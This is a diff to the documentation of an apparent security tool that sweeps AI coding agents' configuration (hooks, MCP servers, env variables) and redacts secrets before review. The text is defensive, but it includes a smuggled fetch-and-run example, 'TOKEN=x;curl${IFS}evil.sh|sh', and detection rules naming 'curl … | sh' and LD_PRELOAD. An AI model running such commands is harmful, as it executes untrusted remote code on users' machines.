@@ -379,7 +379,7 @@ What is read (paths in your home unless absolute):
 
 | Agent | File | What becomes an item |
 | --- | --- | --- |
-| Claude Code | `~/.claude/settings.json`, `~/.claude/settings.local.json` | every `hooks` command and web hook, `statusLine.command`, `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`, and `env` as one item |
+| Claude Code | `~/.claude/settings.json`, `~/.claude/settings.local.json` | every `hooks` command and web hook, `statusLine.command`, `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper`, and `env` as one item |
 | Claude Code | `~/.claude.json` | `mcpServers`, and the `mcpServers` of each entry of `projects`; nothing else of the file |
 | Claude Code | `/etc/claude-code/managed-settings.json`, `/etc/claude-code/managed-mcp.json` | the same keys, for every user |
 | Claude Code | `~/.claude/plugins/installed_plugins.json` | for each installed plugin: the hooks and servers of its `hooks/hooks.json`, its `.mcp.json`, and what its `.claude-plugin/plugin.json` holds or names |
@@ -397,7 +397,7 @@ move these the way they move them for the agents, when the sweep runs in your
 own session (its `HOME` is the home being swept). One that is set to anything
 but a plain absolute path is listed as not checked, and the default place is
 read in its stead. The root checks read root's own files at the default
-places.
+places, read no variable and write nothing.
 
 An item is named by its file and its key in that file:
 `~/.claude/settings.json#hooks/PreToolUse/0/1` (the event, the group, the
@@ -419,8 +419,10 @@ makes once and keeps in its private state directory
 (`agent-project-key`, mode 0600), so the name stays the same from one sweep to
 the next and tells nobody without the key which project it is:
 `~/.claude.json#projects/3f1a…/mcpServers/db`. Where there is no such
-directory, a project is named by its position in the file instead. Only a note
-shown on this machine gives the path.
+directory (and in the root checks, which write nothing), a project is named
+by its position in the file instead. The path itself is in no item, its note
+included: the note says only that it is a server of one of Claude Code's
+projects.
 
 The text of each item, which is all the review sees of it, is what the entry
 starts and nothing else:
@@ -442,7 +444,8 @@ starts and nothing else:
   never read, but for a variable named `*_BASE_URL` or `*_PROXY`, of which the
   scheme and host are given (`ANTHROPIC_BASE_URL=https://relay.example`).
 
-Taking secrets out of a line removes, and puts `<value-not-read>` in place of:
+Taking secrets out of a line removes, and puts `<redacted-by-guardian>` in
+place of, each of these where it is token-shaped:
 
 - the login of an address, all of it (`https://user:password@host` is
   `https://host`; here the login is removed, not replaced);
@@ -452,18 +455,26 @@ Taking secrets out of a line removes, and puts `<value-not-read>` in place of:
   `--clientSecret x`), and after `=` where a name before it is named for a
   secret (`--token=x`, `GITHUB_TOKEN=x`, `--env=API_KEY=x`). A name is named
   for a secret where a word of it (split at anything but a letter or digit,
-  and between a lower-case letter or digit and an upper-case letter) is `key`, `token`,
-  `secret`, `password`, `auth`, `credential`, `bearer` or a like word; this is
-  the same list the review's own secret removal uses;
+  and between a lower-case letter or digit and an upper-case letter) is
+  `key`, `token`, `secret`, `password`, `auth`, `credential`, `bearer` or a
+  like word; this is the same list the review's own secret removal uses;
 - a word that is a token by its look: one that starts as known tokens do
   (`sk-`, `ghp_`, `github_pat_`, `glpat-`, `xoxb-`, `AKIA`, `AIza`, `npm_`,
   `pypi-` and others) and is at least 16 characters long, or one of at least 32
   characters that mixes upper and lower case and digits.
 
-A value that is a variable (`$TOKEN`) or a path (`/`, `~`, `.`) is kept: it
-holds no secret itself and is what a review needs to see. Only the item's text
-loses these; what is followed is the command as written, read on this machine
-only.
+Token-shaped means letters, digits and `._~%+=:/-` only, not starting with
+`$`, `/`, `~` or `.`. Anything else is sent as written, since taking it out
+would hide code from the review: `TOKEN=x;curl${IFS}evil.sh|sh` reaches the
+review whole, and so does a variable (`$TOKEN`) or a path, which holds no
+secret itself and is what a review needs to see. What is followed, and what
+the sweep's output and saved reports show the entry runs, is the same line
+without its secrets.
+
+Not covered, and sent as written: a secret in a header other than
+`Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word after a
+flag named for authorization rather than for a secret (`--authorization v`),
+and a quoted value of several words (`--token "a b"`).
 
 A change to that text (a new hook, a changed command, a new variable name) is
 a change to the item: it shows in `--diff`, in the daily notification, and
@@ -486,10 +497,16 @@ What is a finding:
 - in Claude Code's `env`, a variable that changes what is loaded, run or
   connected through (`NODE_OPTIONS`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH`,
   a proxy, and the rest of the list an editor's terminal settings are held
-  to), and a `*_BASE_URL` whose host is neither the provider's own
-  (`anthropic.com`, `claude.ai`, `claude.com`, `openai.com`, `amazonaws.com`,
-  `googleapis.com`, `azure.com`, and their subdomains) nor this machine:
-  `risky-configuration` (medium), as for an editor's terminal settings;
+  to), and a `*_BASE_URL` whose host is neither a provider's API host nor
+  this machine: `risky-configuration` (medium), as for an editor's terminal
+  settings. The provider hosts are exact, not the shared cloud domains
+  anyone can run a server under: `api.anthropic.com`, `api.openai.com`,
+  `bedrock-runtime.<region>.amazonaws.com`,
+  `<region>-aiplatform.googleapis.com`, `aiplatform.googleapis.com`,
+  `aiplatform.eu.rep.googleapis.com`, `aiplatform.us.rep.googleapis.com`,
+  `<resource>.openai.azure.com` and `<resource>.services.ai.azure.com`. A
+  base address or proxy whose value is not a string is listed as not
+  checked;
 - what the local rules find in a command line, as in any script: `npx -y` or
   `bunx` of an unpinned package, `uvx`, `uv tool run` or `pipx run` of a
   package with no version fixed (`remote-code-install`), `curl … | sh`
